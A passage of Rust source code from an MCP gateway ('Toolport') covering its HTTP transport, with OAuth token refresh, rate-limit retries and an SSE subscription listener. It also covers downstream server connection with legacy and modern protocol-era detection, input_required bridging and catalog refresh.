    fn post(&mut self, body: &Value, expect_response: bool) -> Result<Option<Value>, TransportError> {
        self.post_with_headers(body, expect_response, &[])
    }

    fn post_with_headers(
        &mut self,
        body: &Value,
        expect_response: bool,
        extra_headers: &[(String, String)],
    ) -> Result<Option<Value>, TransportError> {
        let payload = body.to_string();

        // Refresh shortly before the known expiry, including before initialize.
        // The callback keeps the deadline in memory, so this is a cheap no-op on
        // ordinary calls and only touches vaulted OAuth state when refresh is due.
        self.refresh_before_send();

        // Token refresh is handled internally (it doesn't sleep, so no lock
        // contention). Only 429 and transport-retry signals bubble up as
        // TransportError::Retry so the Router can sleep *outside* the lock.
        // Per-token, not per-call: connect alone posts twice (`initialize`, then
        // the `server/discover` era probe) and must not spend two forced
        // exchanges on one expired token (SOU-474).
        let mut refreshed = self.forced_refresh_spent();
        let wire_version = self.wire_protocol_version();
        let resp = loop {
            let mut req = self
                .agent
                .post(&self.url)
                .set("Content-Type", "application/json")
                .set("Accept", "application/json, text/event-stream")
                .set("MCP-Protocol-Version", &wire_version);
            if !self.is_modern() {
                if let Some(sid) = &self.session_id {
                    req = req.set("Mcp-Session-Id", sid);
                }
            }
            if self.is_modern() {
                for (name, value) in modern_standard_headers(body)? {
                    req = req.set(&name, &value);
                }
                for (name, value) in extra_headers {
                    req = req.set(name, value);
                }
            }
            let auth = self
                .auth
                .lock()
                .unwrap_or_else(std::sync::PoisonError::into_inner)
                .clone();
            if let Some(token) = auth.as_deref() {
                req = req.set("Authorization", &bearer_header(token));
            }

            match req.send_string(&payload) {
                Ok(r) => break r,
                // Rate limited: return a Retry signal so the Router sleeps
                // *outside* the per-server Mutex.
                Err(ureq::Error::Status(429, r)) => {
                    let retry_after = r.header("retry-after").and_then(retry_after_delay);
                    let _ = read_capped(r, 8 * 1024);
                    return Err(TransportError::Retry {
                        retry_after,
                        message: "HTTP 429: rate limited".to_string(),
                    });
                }
                Err(ureq::Error::Status(code, r))
                    if (code == 401 || code == 403)
                        && insufficient_scope_challenge(&r).is_some() =>
                {
                    let challenge = insufficient_scope_challenge(&r)
                        .expect("match guard established an insufficient-scope challenge");
                    let _ = read_capped(r, 8 * 1024);
                    let operation = authorization_operation(body);
                    self.reauthorize_after_scope_challenge(code, &operation, challenge)?;
                    refreshed = true;
                    continue;
                }
                // The access token likely expired: refresh it once and retry with
                // the new token, so a long-running session self-heals instead of
                // 401ing until the server is manually reconnected.
                Err(ureq::Error::Status(code, r))
                    if (code == 401 || code == 403) && !refreshed && self.refresh.is_some() =>
                {
                    let _ = read_capped(r, 8 * 1024);
                    refreshed = true;
                    self.force_refresh_after_auth_error(code)?;
                    continue;
                }
                Err(ureq::Error::Status(code, r)) => {
                    let detail = read_capped(r, 64 * 1024);
                    if code == 400 && self.is_modern() && expect_response {
                        if let Ok(response) = serde_json::from_str::<Value>(&detail) {
                            let request_id = body.get("id");
                            if ids_match(response.get("id"), request_id) {
                                if let Some(error) = response.get("error") {
                                    return Err(TransportError::Rpc(error.clone()));
                                }
                            }
                        }
                    }
                    let detail: String = detail.chars().take(200).collect();
                    let hint = if code == 401 || code == 403 {
                        " (needs authentication)"
                    } else {
                        ""
                    };
                    return Err(TransportError::Fatal(format!("HTTP {code}{hint}: {detail}")));
                }
                // Transport error (DNS / connection failure): retryable, but
                // the Router owns the backoff sleep so the Mutex is released.
                Err(ureq::Error::Transport(t)) if is_retryable_transport(&t) => {
                    return Err(TransportError::Retry {
                        retry_after: None,
                        message: format!("transport error (retryable): {t}"),
                    });
                }
                Err(e) => return Err(TransportError::Fatal(e.to_string())),
            }
        };
        // The server accepted this token, so its forced-refresh budget is spent
        // on nothing and must be returned. See [`Self::forced_refresh_token`].
        self.forced_refresh_token = None;

        if !self.is_modern() {
            if let Some(sid) = resp.header("Mcp-Session-Id") {
                self.session_id = Some(sid.to_string());
            }
        }
        if !expect_response {
            return Ok(None);
        }

        let is_sse = resp
            .header("content-type")
            .map(|c| c.to_lowercase().contains("text/event-stream"))
            .unwrap_or(false);
        if is_sse {
            return self.read_sse_response(resp, body);
        }

        let text = read_capped(resp, MAX_RESPONSE_BYTES);
        serde_json::from_str(&text)
            .map(Some)
            .map_err(|e| TransportError::Fatal(format!("bad JSON response: {e}")))
    }
}

impl Transport for HttpTransport {
    fn request(&mut self, method: &str, params: Value) -> Result<Value, TransportError> {
        self.request_inner(method, params, &[])
    }

    fn request_with_cancel_and_headers(
        &mut self,
        method: &str,
        params: Value,
        cancel: Option<CancelContext>,
        headers: &[(String, String)],
    ) -> Result<Value, TransportError> {
        if cancel.is_some() {
            downstream_trace(&format!(
                "cancellation closes the modern HTTP response stream for method {method}"
            ));
        }
        self.request_inner(method, params, headers)
    }

    fn supports_request_headers(&self) -> bool {
        true
    }

    fn notify(&mut self, method: &str, params: Value) -> Result<(), TransportError> {
        // Notifications carry the connection's protocol metadata too, so a modern
        // server sees a consistent story on every message rather than only on
        // requests. (The revision leaves notification headers undefined, so this
        // is consistency rather than a hard requirement.)
        let mut params = params;
        if let Some(protocol) = &self.protocol_meta {
            merge_protocol_meta(&mut params, protocol);
        }
        let body = json!({ "jsonrpc": "2.0", "method": method, "params": params });
        self.post(&body, false)?;
        Ok(())
    }

    fn set_server_request_handler(&mut self, handler: ServerRequestHandler) {
        self.server_handler = Some(handler);
    }

    fn set_protocol_meta(&mut self, meta: Option<Value>) {
        self.protocol_meta = meta;
        if let Some(meta) = self.protocol_meta.as_mut() {
            merge_declared_extensions(meta, &self.declared_extensions);
        }
        if self.protocol_meta.is_some() {
            self.session_id = None;
        }
    }

    fn set_subscription_listener(
        &mut self,
        filter: SubscriptionFilter,
    ) -> Result<(), TransportError> {
        let id = self.next_id;
        self.next_id += 1;
        let mut params = filter.params();
        if let Some(protocol) = &self.protocol_meta {
            merge_protocol_meta(&mut params, protocol);
        }
        let payload = json!({
            "jsonrpc": "2.0",
            "id": id,
            "method": "subscriptions/listen",
            "params": params,
        })
        .to_string();
        let generation = self.listener_generation.fetch_add(1, Ordering::SeqCst) + 1;
        let live_generation = Arc::clone(&self.listener_generation);
        let agent = self.agent.clone();
        let url = self.url.clone();
        let auth = Arc::clone(&self.auth);
        let refresh = self.refresh.clone();
        let scope_reauthorize = self.scope_reauthorize.clone();
        let scope_upgrade_attempts = Arc::clone(&self.scope_upgrade_attempts);
        let wire_version = self.wire_protocol_version();
        let dirty = self.change_dirty.clone();
        let resource_updated = self.resource_updated.clone();
        self.subscription_listener_id = Some(id);

        std::thread::spawn(move || {
            let mut retry_delay = Duration::from_millis(250);
            while live_generation.load(Ordering::SeqCst) == generation {
                if let Some(refresh) = &refresh {
                    if let Ok(refresh) = refresh.lock() {
                        if let Ok(Some(token)) = refresh(false) {
                            *auth
                                .lock()
                                .unwrap_or_else(std::sync::PoisonError::into_inner) = Some(token);
                        }
                    }
                }
                let mut forced_refresh = false;
                let response = loop {
                    let mut request = agent
                        .post(&url)
                        .set("Content-Type", "application/json")
                        .set("Accept", "text/event-stream")
                        .set("MCP-Protocol-Version", &wire_version)
                        .set("Mcp-Method", "subscriptions/listen");
                    let token = auth
                        .lock()
                        .unwrap_or_else(std::sync::PoisonError::into_inner)
                        .clone();
                    if let Some(token) = token.as_deref() {
                        request = request.set("Authorization", &bearer_header(token));
                    }
                    match request.send_string(&payload) {
                        Ok(response) => break Some(response),
                        Err(ureq::Error::Status(code, response))
                            if (code == 401 || code == 403)
                                && insufficient_scope_challenge(&response).is_some() =>
                        {
                            let challenge = insufficient_scope_challenge(&response)
                                .expect("match guard established an insufficient-scope challenge");
                            let _ = read_capped(response, 8 * 1024);
                            let Some(scope) = challenge
                                .scope
                                .map(|scope| canonical_scope_set(&scope))
                                .filter(|scope| !scope.is_empty())
                            else {
                                downstream_trace(
                                    "subscriptions/listen insufficient_scope challenge omitted scope",
                                );
                                break None;
                            };
                            let attempt_key =
                                ("subscriptions/listen".to_string(), scope.clone());
                            let first_attempt = scope_upgrade_attempts
                                .lock()
                                .map(|mut attempts| attempts.insert(attempt_key))
                                .unwrap_or(false);
                            let upgraded = if first_attempt {
                                scope_reauthorize.as_ref().and_then(|callback| {
                                    callback
                                        .lock()
                                        .ok()
                                        .and_then(|callback| callback(&scope).ok())
                                })
                            } else {
                                None
                            };
                            match upgraded {
                                Some(token) => {
                                    *auth
                                        .lock()
                                        .unwrap_or_else(std::sync::PoisonError::into_inner) =
                                        Some(token);
                                    forced_refresh = true;
                                    continue;
                                }
                                None => {
                                    downstream_trace(&format!(
                                        "subscriptions/listen needs interactive OAuth scope '{scope}'"
                                    ));
                                    break None;
                                }
                            }
                        }
                        Err(ureq::Error::Status(code, response))
                            if (code == 401 || code == 403)
                                && !forced_refresh
                                && refresh.is_some() =>
                        {
                            let _ = read_capped(response, 8 * 1024);
                            forced_refresh = true;
                            let refreshed = refresh.as_ref().and_then(|refresh| {
                                refresh
                                    .lock()
                                    .ok()
                                    .and_then(|refresh| refresh(true).ok())
                                    .flatten()
                            });
                            match refreshed {
                                Some(token) => {
                                    *auth
                                        .lock()
                                        .unwrap_or_else(std::sync::PoisonError::into_inner) =
                                        Some(token);
                                    continue;
                                }
                                None => break None,
                            }
                        }
                        Err(error) => {
                            downstream_trace(&format!(
                                "subscriptions/listen HTTP open failed: {error}"
                            ));
                            break None;
                        }
                    }
                };
                let Some(response) = response else {
                    std::thread::sleep(retry_delay);
                    retry_delay = (retry_delay * 2).min(Duration::from_secs(5));
                    continue;
                };
                let is_sse = response.header("content-type").is_some_and(|value| {
                    value.to_ascii_lowercase().contains("text/event-stream")
                });
                if !is_sse {
                    let detail: String =
                        read_capped(response, 64 * 1024).chars().take(200).collect();
                    downstream_trace(&format!(
                        "subscriptions/listen returned a non-SSE response: {detail}"
                    ));
                    std::thread::sleep(retry_delay);
                    retry_delay = (retry_delay * 2).min(Duration::from_secs(5));
                    continue;
                }

                retry_delay = Duration::from_millis(250);
                let mut reader = BufReader::new(response.into_reader());
                loop {
                    if live_generation.load(Ordering::SeqCst) != generation {
                        return;
                    }
                    let mut line = String::new();
                    let read = match (&mut reader)
                        .take(MAX_RESPONSE_BYTES)
                        .read_line(&mut line)
                    {
                        Ok(read) => read,
                        Err(error) => {
                            downstream_trace(&format!(
                                "subscriptions/listen SSE read failed: {error}"
                            ));
                            break;
                        }
                    };
                    if read == 0 {
                        break;
                    }
                    if read as u64 >= MAX_RESPONSE_BYTES && !line.ends_with('\n') {
                        downstream_trace("subscriptions/listen emitted an oversized SSE line");
                        break;
                    }
                    if live_generation.load(Ordering::SeqCst) != generation {
                        return;
                    }
                    let Some(data) = line.trim_start().strip_prefix("data:") else {
                        continue;
                    };
                    let data = data.trim();
                    let Ok(notification) = serde_json::from_str::<Value>(data) else {
                        continue;
                    };
                    let subscription_id = notification
                        .get("params")
                        .and_then(|params| params.get("_meta"))
                        .and_then(|meta| meta.get("io.modelcontextprotocol/subscriptionId"));
                    if subscription_id != Some(&json!(id)) {
                        continue;
                    }
                    let method = notification.get("method").and_then(Value::as_str);
                    let kind = match method {
                        Some("notifications/tools/list_changed") => change::TOOLS,
                        Some("notifications/resources/list_changed") => change::RESOURCES,
                        Some("notifications/prompts/list_changed") => change::PROMPTS,
                        _ => 0,
                    };
                    if kind != 0 {
                        if let Some(dirty) = &dirty {
                            dirty.fetch_or(kind, Ordering::SeqCst);
                        }
                        continue;
                    }
                    if method == Some("notifications/resources/updated") {
                        if let (Some(sink), Some(uri)) = (
                            resource_updated.as_ref(),
                            notification
                                .get("params")
                                .and_then(|params| params.get("uri"))
                                .and_then(Value::as_str),
                        ) {
                            sink(uri.to_string());
                        }
                    }
                }
                if live_generation.load(Ordering::SeqCst) == generation {
                    std::thread::sleep(retry_delay);
                }
            }
        });
        Ok(())
    }
}

impl Drop for HttpTransport {
    fn drop(&mut self) {
        self.listener_generation.fetch_add(1, Ordering::SeqCst);
    }
}

/// One connected downstream server: its id, its transport, and its cached
/// tools, resources, resource templates, and prompts.
pub struct DownstreamServer {
    pub id: String,
    transport: Box<dyn Transport>,
    pub tools: Vec<Value>,
    pub resources: Vec<Value>,
    /// Parameterized resource URI templates (`resources/templates/list`).
    /// Refreshed with concrete resources on `resources/list_changed` because
    /// MCP defines no separate templates list-change notification.
    pub resource_templates: Vec<Value>,
    pub prompts: Vec<Value>,
    tool_cache_hint: CacheHint,
    resource_cache_hint: CacheHint,
    resource_template_cache_hint: CacheHint,
    prompt_cache_hint: CacheHint,
    /// Consecutive successful empty tools/list responses while tools were non-empty
    /// (SOU-338). Reset on any non-empty refresh. See [`EMPTY_CATALOG_CONFIRMATIONS`].
    empty_tools_streak: u8,
    empty_resources_streak: u8,
    empty_templates_streak: u8,
    empty_prompts_streak: u8,
    /// Whether the server's `initialize` advertised resources / prompts. The
    /// actual lists are fetched lazily via `load_resources_prompts`.
    caps_resources: bool,
    caps_prompts: bool,
    /// Whether the server's `initialize` advertised the completions utility.
    caps_completions: bool,
    /// Opaque extension settings advertised by a modern server. These are
    /// aggregated verbatim for modern upstream discovery; legacy extension
    /// negotiation is initialize-scoped and cannot safely be bridged here.
    caps_extensions: serde_json::Map<String, Value>,
    /// The protocol era this connection settled on at handshake (SOU-445).
    era: Era,
    /// Modern Streamable HTTP can mirror schema-annotated tool arguments into
    /// routing headers. Modern stdio deliberately ignores those annotations.
    modern_http: bool,
    /// Desired per-resource notification set carried by the modern listener.
    /// Legacy servers keep using resources/subscribe and resources/unsubscribe.
    modern_resource_subscriptions: HashSet<String>,
    /// Existing legacy server-to-client request bridge. Modern downstream
    /// `input_required` results use it as a compatibility shim when the upstream
    /// client predates MRTR.
    server_handler: Option<ServerRequestHandler>,
}

/// The compatibility shim holds the originating legacy request open, so keep a
/// tighter bound than the modern client driver's ten-round default.
const MRTR_LEGACY_MAX_ROUNDS: usize = 8;
const MRTR_STATE_ONLY_DELAY: Duration = Duration::from_millis(250);
static MRTR_LEGACY_REQUEST_ID: AtomicU64 = AtomicU64::new(1);

impl DownstreamServer {
    /// Handshake with the server and fetch its tool list. Resources and prompts
    /// are NOT fetched here - only whether the server advertises them is noted,
    /// so the health probe (which connects to every server in one batch) stays
    /// tools-only and fast and can't stall on a slow or hanging resources/prompts
    /// endpoint. The gateway calls `load_resources_prompts` to populate them.
    pub fn connect(id: String, mut transport: Box<dyn Transport>) -> Result<Self, String> {
        // Fail the handshake fast so one unresponsive server can't stall the whole
        // batch probe / router rebuild for the full live-call timeout. The transport
        // picks the budget: download-then-run launchers (npx, uvx, ...) get a long
        // first-`initialize` window because a cold cache means the package downloads
        // before the server can answer at all.
        let handshake_timeout = transport.connect_timeout();
        transport.set_read_timeout(handshake_timeout);

        // Era detection (SOU-445). Toolport is dual-era: it must drive both
        // `initialize`-era servers and modern stateless ones.
        //
        // We try `initialize` FIRST and fall forward, rather than probing with
        // `server/discover` first as the spec suggests. The spec's ordering is a
        // SHOULD, and for Toolport it is the wrong trade today: essentially every
        // installed server is legacy, and a legacy stdio server typically answers
        // an unknown method with silence rather than an error - so a discover-first
        // probe would charge every existing user a read-timeout on every connect.
        // Going legacy-first costs the existing install base exactly nothing and
        // costs a modern server one cheap rejected request. Worth revisiting once
        // modern servers are common.
        let (era, caps) = match transport.request(
            "initialize",
            json!({
                "protocolVersion": PROTOCOL_VERSION,
                "capabilities": {},
                "clientInfo": { "name": "toolport-gateway", "version": env!("CARGO_PKG_VERSION") }
            }),
        ) {
            Ok(init) => {
                let version = init
                    .get("protocolVersion")
                    .and_then(Value::as_str)
                    .unwrap_or(PROTOCOL_VERSION)
                    .to_string();
                let caps = init.get("capabilities").cloned();
                transport
                    .notify("notifications/initialized", json!({}))
                    .map_err(|e| e.to_string())?;
                (Era::Legacy { version }, caps)
            }
            // A dead or unresponsive server is not a modern server. Probing it
            // again would just double the wait before reporting the same failure.
            Err(err) if err.is_health_failure() => return Err(err.to_string()),
            Err(init_err) => {
                // The server answered, but refused `initialize`. A modern server
                // has no such method. Confirm with `server/discover`, which every
                // modern server MUST implement, rather than guessing from an
                // error code the spec leaves implementation-defined.
                // Bound the probe tightly, and restore the handshake budget after.
                //
                // A launcher-wrapped server (npx, uvx) carries a 120s connect
                // budget so a cold package download can finish. Inheriting that
                // here would turn "legacy server rejected initialize" - a missing
                // API key, a bad config - from an instant failure into a two
                // minute hang, and a batch probe or router rebuild waits on the
                // slowest server. A server that implements `server/discover`
                // answers it locally and immediately, so it needs none of that
                // budget.
                // The post-match `set_read_timeout(STDIO_CONNECT_TIMEOUT)` below
                // restores a normal budget for the rest of the handshake.
                transport.set_read_timeout(PROBE_TIMEOUT);

                // Stamp the modern metadata BEFORE probing, not after. On HTTP the
                // transport derives `MCP-Protocol-Version` from it, and that header
                // MUST match the body's `_meta`; probing first would send a legacy
                // header with a modern body and a strict server would reject the
                // very request meant to detect it, with HeaderMismatch (-32020).
                transport.set_protocol_meta(Some(protocol_meta_for(MODERN_PROTOCOL_VERSION)));
                let probe = transport.request("server/discover", json!({}));
                let discovered = match probe {
                    Ok(discovered) => discovered,
                    // This is the pivot of the compatibility ladder. A RECOGNIZED
                    // modern error means the server is modern and simply does not
                    // speak the version we declared, so the honest outcome is a
                    // version mismatch, not "legacy server". Reporting the
                    // `initialize` refusal here would send someone chasing a
                    // handshake bug on a perfectly reachable modern server.
                    Err(probe_err) if probe_err.is_modern_protocol_error() => {
                        let offered = probe_err.supported_versions();
                        // Retry on a mutually supported version if there is one.
                        // Today Toolport speaks exactly one modern revision, so
                        // this is usually a clean incompatibility, but the ladder
                        // is written to negotiate rather than to assume.
                        match offered.iter().find(|v| v.as_str() == MODERN_PROTOCOL_VERSION) {
                            Some(version) => {
                                // Re-stamp before retrying so header and body agree
                                // on the newly chosen version too.
                                transport.set_protocol_meta(Some(protocol_meta_for(version)));
                                transport
                                    .request("server/discover", json!({}))
                                    .map_err(|e| e.to_string())?
                            }
                            None => {
                                return Err(format!(
                                    "server speaks MCP {offered:?}; Toolport speaks \
                                     {MODERN_PROTOCOL_VERSION} and cannot negotiate a \
                                     common version ({probe_err})"
                                ))
                            }
                        }
                    }
                    // Anything else (an unrecognized error, or silence) identifies
                    // a legacy server, so the `initialize` refusal is the
                    // actionable error. Carry the probe failure too: if discover
                    // timed out rather than being refused, reporting only the
                    // initialize error hides that connect paid a read timeout.
                    Err(probe_err) => {
                        return Err(format!(
                            "{init_err} (server/discover probe also failed: {probe_err})"
                        ))
                    }
                };
                let version = choose_protocol_version(&discovered).ok_or_else(|| {
                    format!(
                        "server supports no protocol version Toolport speaks (offered {:?})",
                        discovered.get("supportedVersions")
                    )
                })?;
                let capabilities = discovered.get("capabilities").cloned();
                // From here every request carries its own protocol metadata;
                // there is no handshake and no `notifications/initialized`.
                // Catalog fetches additionally declare the MCP Apps MIME when
                // this server offers it, so a capability-aware server includes
                // its UI tool metadata in tools/list.
                transport.set_protocol_meta(Some(protocol_meta_for_catalog(
                    &version,
                    capabilities.as_ref(),
                )));
                (Era::Modern { version }, capabilities)
            }
        };
        let caps = caps.as_ref();
        let caps_resources = caps.and_then(|c| c.get("resources")).is_some();
        let caps_prompts = caps.and_then(|c| c.get("prompts")).is_some();
        let caps_completions = caps.and_then(|c| c.get("completions")).is_some();
        let caps_extensions = if matches!(era, Era::Modern { .. }) {
            caps.and_then(|c| c.get("extensions"))
                .and_then(Value::as_object)
                .cloned()
                .unwrap_or_default()
        } else {
            serde_json::Map::new()
        };

        // `initialize` answered, so any launcher download is done: the rest of the
        // handshake goes back to the tight budget - a server that comes up but then
        // hangs on `tools/list` should still fail in seconds.
        transport.set_read_timeout(STDIO_CONNECT_TIMEOUT);
        let listed = fetch_paginated_list(&mut *transport, "tools/list", "tools")
            .map_err(|e| e.to_string())?;
        if let Some(warning) = &listed.warning {
            eprintln!("toolport: server '{id}' returned a partial tool catalog: {warning}");
        }
        let modern_http = matches!(era, Era::Modern { .. }) && transport.supports_request_headers();
        let tools = if modern_http {
            filter_modern_http_tools(&id, listed.items)
        } else {
            listed.items
        };

        // MCP Apps is advertised only for capability-aware catalog fetches.
        // Restore Toolport's ordinary per-request metadata before any live call
        // so a non-Apps upstream client cannot inherit that capability.
        if let Era::Modern { version } = &era {
            transport.set_protocol_meta(Some(protocol_meta_for(version)));
        }

        // Restore the longer timeout: actual tool calls can legitimately be slow.
        transport.set_read_timeout(STDIO_READ_TIMEOUT);
        // Handshake done: from here on, react to the server's own tool-list
        // changes (ignored until now so a startup announcement is a no-op).
        transport.arm_tools_watch();
        if matches!(era, Era::Modern { .. }) {
            transport
                .set_subscription_listener(SubscriptionFilter {
                    tools_list_changed: true,
                    prompts_list_changed: caps_prompts,
                    resources_list_changed: caps_resources,
                    resource_subscriptions: Vec::new(),
                })
                .map_err(|error| error.to_string())?;
        }

        Ok(DownstreamServer {
            id,
            transport,
            tools,
            resources: Vec::new(),
            resource_templates: Vec::new(),
            prompts: Vec::new(),
            tool_cache_hint: listed.cache_hint,
            resource_cache_hint: CacheHint::default(),
            resource_template_cache_hint: CacheHint::default(),
            prompt_cache_hint: CacheHint::default(),
            empty_tools_streak: 0,
            empty_resources_streak: 0,
            empty_templates_streak: 0,
            empty_prompts_streak: 0,
            caps_resources,
            caps_prompts,
            caps_completions,
            caps_extensions,
            era,
            modern_http,
            modern_resource_subscriptions: std::collections::HashSet::new(),
            server_handler: None,
        })
    }

    /// Install the upstream request bridge on both this server wrapper and its
    /// transport. The transport consumes real legacy server-initiated requests;
    /// the wrapper consumes modern `input_required` results for legacy clients.
    pub fn set_server_request_handler(&mut self, handler: ServerRequestHandler) {
        self.transport.set_server_request_handler(Arc::clone(&handler));
        self.server_handler = Some(handler);
    }

    fn fulfill_input_required(&self, result: &Value) -> Result<MrtrRequest, TransportError> {
        let requests = match result.get("inputRequests") {
            None => None,
            Some(Value::Object(requests)) => Some(requests),
            Some(_) => {
                return Err(TransportError::Fatal(
                    "modern server returned non-object inputRequests".to_string(),
                ))
            }
        };
        let request_state = match result.get("requestState") {
            None => None,
            Some(Value::String(state)) => Some(Value::String(state.clone())),
            Some(_) => {
                return Err(TransportError::Fatal(
                    "modern server returned non-string requestState".to_string(),
                ))
            }
        };
        if requests.map_or(true, serde_json::Map::is_empty) && request_state.is_none() {
            return Err(TransportError::Fatal(
                "modern server returned input_required without inputRequests or requestState"
                    .to_string(),
            ));
        }

        let mut input_responses = serde_json::Map::new();
        if let Some(requests) = requests {
            let handler = self.server_handler.as_ref().ok_or_else(|| {
                TransportError::Fatal(
                    "upstream client cannot fulfill the server's input_required result"
                        .to_string(),
                )
            })?;
            for (key, input) in requests {
                let method = input
                    .get("method")
                    .and_then(Value::as_str)
                    .ok_or_else(|| {
                        TransportError::Fatal(format!(
                            "input request '{key}' is missing a method"
                        ))
                    })?;
                if !matches!(
                    method,
                    "roots/list" | "sampling/createMessage" | "elicitation/create"
                ) {
                    return Err(TransportError::Fatal(format!(
                        "input request '{key}' uses unsupported method '{method}'"
                    )));
                }
                let id = json!(format!(
                    "toolport-mrtr-{}",
                    MRTR_LEGACY_REQUEST_ID.fetch_add(1, Ordering::Relaxed)
                ));
                let request = json!({
                    "jsonrpc": "2.0",
                    "id": id,
                    "method": method,
                    "params": input.get("params").cloned().unwrap_or_else(|| json!({}))
                });
                let response = match handler(&request) {
                    Some(ServerRequestAction::Respond(response)) => response,
                    Some(ServerRequestAction::InputRequired) => {
                        return Err(TransportError::Fatal(
                            "cannot nest an input_required bridge while fulfilling one"
                                .to_string(),
                        ))
                    }
                    None => {
                        return Err(TransportError::Fatal(format!(
                            "upstream client did not handle input request '{key}' ({method})"
                        )))
                    }
                };
                if let Some(error) = response.get("error") {
                    return Err(TransportError::Rpc(error.clone()));
                }
                let response = response.get("result").cloned().ok_or_else(|| {
                    TransportError::Fatal(format!(
                        "upstream client returned no result for input request '{key}'"
                    ))
                })?;
                input_responses.insert(key.clone(), response);
            }
        }

        if input_responses.is_empty() {
            std::thread::sleep(MRTR_STATE_ONLY_DELAY);
        }
        Ok(MrtrRequest {
            input_responses: (!input_responses.is_empty()).then(|| Value::Object(input_responses)),
            request_state,
        })
    }

    fn request_with_mrtr(
        &mut self,
        method: &str,
        params: Value,
        cancel: Option<CancelContext>,
        meta: Option<&Value>,
        mrtr: Option<&MrtrRequest>,
        headers: &[(String, String)],
    ) -> Result<Value, TransportError> {
        let modern_upstream = upstream_is_modern(meta);
        let modern_downstream = matches!(self.era, Era::Modern { .. });
        let mut retry = mrtr.cloned().unwrap_or_default();
        for round in 0..=MRTR_LEGACY_MAX_ROUNDS {
            let mut params = with_meta_and_mrtr(params.clone(), meta, Some(&retry));
            if modern_downstream {
                attach_client_extensions(&mut params, meta);
            }
            let result = self.transport.request_with_cancel_and_headers(
                method,
                params,
                cancel.clone(),
                headers,
            )?;
            if result.get("resultType").and_then(Value::as_str) != Some("input_required")
                || modern_upstream
            {
                return Ok(result);
            }
            if round == MRTR_LEGACY_MAX_ROUNDS {
                return Err(TransportError::Fatal(format!(
                    "modern server exceeded the {MRTR_LEGACY_MAX_ROUNDS}-round input_required limit"
                )));
            }
            retry = self.fulfill_input_required(&result)?;
        }
        unreachable!("bounded MRTR loop always returns")
    }

    /// Re-fetch the server's tool list on the existing connection, after it
    /// announced a `tools/list_changed`. Bounds the wait like the handshake so a
    /// hung server can't stall the refresh; on error the previous list is kept.
    pub fn refresh_tools(&mut self) {
        self.refresh_tools_inner();
    }

    /// Refresh a positive-TTL catalog only once its downstream freshness window
    /// expires. Notifications keep calling `refresh_tools` and therefore bypass
    /// this check: they invalidate a still-fresh result immediately.
    pub fn refresh_tools_if_stale(&mut self) {
        if self.tool_cache_hint.needs_refresh() {
            self.refresh_tools_inner();
        }
    }

    fn refresh_tools_inner(&mut self) {
        self.transport.set_read_timeout(STDIO_CONNECT_TIMEOUT);
        let modern_version = match &self.era {
            Era::Modern { version } => Some(version.clone()),
            Era::Legacy { .. } => None,
        };
        if let Some(version) = modern_version.as_deref() {
            let capabilities = json!({ "extensions": self.caps_extensions.clone() });
            self.transport.set_protocol_meta(Some(protocol_meta_for_catalog(
                version,
                Some(&capabilities),
            )));
        }
        let listed = fetch_paginated_list(&mut *self.transport, "tools/list", "tools");
        if let Some(version) = modern_version.as_deref() {
            self.transport
                .set_protocol_meta(Some(protocol_meta_for(version)));
        }
        match listed {
            Ok(listed) if listed.warning.is_none() => {
                let new_tools = if self.modern_http {
                    filter_modern_http_tools(&self.id, listed.items)
                } else {
                    listed.items
                };
                apply_catalog_refresh(
                    &mut self.tools,
                    new_tools,
                    &mut self.empty_tools_streak,
                    &mut self.tool_cache_hint,
                    listed.cache_hint,
                    &self.id,
                    "tool",
                );
            }
            Ok(listed) => {
                self.tool_cache_hint.mark_stale_and_defer();
                eprintln!(
                    "toolport: keeping server '{}' previous tool catalog after an incomplete refresh: {}",
                    self.id,
                    listed.warning.unwrap_or_default()
                );
            }
            Err(error) => {
                self.tool_cache_hint.mark_stale_and_defer();
                eprintln!(
                    "toolport: keeping server '{}' previous tool catalog after refresh failed: {error}",
                    self.id
                );
            }
        }
        self.transport.set_read_timeout(STDIO_READ_TIMEOUT);
    }

    /// Re-fetch the resource list on the existing connection after the server
    /// announced a `resources/list_changed`. Mirrors [`refresh_tools`]; best-effort
    /// (an error keeps the previous list), and a no-op if the server never
    /// advertised resources.
    ///
    /// Also re-fetches resource templates on the same notification. MCP has no
    /// separate `resources/templates/list_changed`; template catalogs change
    /// under the resources capability, so this is the protocol-aligned trigger.
    pub fn refresh_resources(&mut self) {
        self.refresh_resources_inner();
    }

    pub fn refresh_resources_if_stale(&mut self) {
        if self.resource_cache_hint.needs_refresh()
            || self.resource_template_cache_hint.needs_refresh()
        {
            self.refresh_resources_inner();
        }
    }

    fn refresh_resources_inner(&mut self) {
        if !self.caps_resources {
            return;
        }
        self.transport.set_read_timeout(STDIO_CONNECT_TIMEOUT);
        match fetch_paginated_list(&mut *self.transport, "resources/list", "resources") {
            Ok(listed) if listed.warning.is_none() => {
                apply_catalog_refresh(
                    &mut self.resources,
                    listed.items,
                    &mut self.empty_resources_streak,
                    &mut self.resource_cache_hint,
                    listed.cache_hint,
                    &self.id,
                    "resource",
                );
            }
            Ok(listed) => {
                self.resource_cache_hint.mark_stale_and_defer();
                eprintln!(
                    "toolport: keeping server '{}' previous resource catalog after an incomplete refresh: {}",
                    self.id,
                    listed.warning.unwrap_or_default()
                );
            }
            Err(error) => {
                self.resource_cache_hint.mark_stale_and_defer();
                eprintln!(
                    "toolport: keeping server '{}' previous resource catalog after refresh failed: {error}",
                    self.id
                );
            }
        }
        // Templates share the resources capability and list-change signal.
        // Incomplete/failed traversal keeps the previous complete snapshot.
        match fetch_paginated_list(
            &mut *self.transport,
            "resources/templates/list",
            "resourceTemplates",
        ) {
            Ok(listed) if listed.warning.is_none() => {
                apply_catalog_refresh(
                    &mut self.resource_templates,
                    listed.items,
                    &mut self.empty_templates_streak,
                    &mut self.resource_template_cache_hint,
                    listed.cache_hint,
                    &self.id,
                    "resource-template",
                );
            }
            Ok(listed) => {
                self.resource_template_cache_hint.mark_stale_and_defer();
                eprintln!(
                    "toolport: keeping server '{}' previous resource-template catalog after an incomplete refresh: {}",
                    self.id,
                    listed.warning.unwrap_or_default()
                );
            }
            Err(error) => {
                self.resource_template_cache_hint.mark_stale_and_defer();
                eprintln!(
                    "toolport: keeping server '{}' previous resource-template catalog after refresh failed: {error}",
                    self.id
                );
            }
        }
        self.transport.set_read_timeout(STDIO_READ_TIMEOUT);
    }

    /// Re-fetch the prompt list on the existing connection after the server
    /// announced a `prompts/list_changed`. Mirrors [`refresh_tools`]; best-effort,
    /// and a no-op if the server never advertised prompts.
    pub fn refresh_prompts(&mut self) {
        self.refresh_prompts_inner();
    }

    pub fn refresh_prompts_if_stale(&mut self) {
